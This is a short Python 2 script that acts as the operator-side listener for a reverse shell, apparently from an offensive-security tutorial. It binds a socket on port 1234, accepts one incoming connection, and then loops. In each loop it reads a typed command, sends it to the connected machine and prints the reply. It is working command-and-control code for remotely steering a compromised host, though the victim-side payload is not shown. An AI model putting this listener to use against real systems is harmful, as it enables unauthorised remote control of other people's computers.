#!/usr/bin/python

import socket

listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
#options to reuse sockets
listener.bind(("localhost",1234))
listener.listen(0)
print "[+] Waiting for Incoming Connection"
#listen for connecion backlog is set to 0 don't need to worry about 0
connection,address = listener.accept()
print "[+] Got a Connection from " + str(address)

while True:
	command = raw_input(">> ")
	connection.send(command)
	result = connection.recv(1024)
	print result

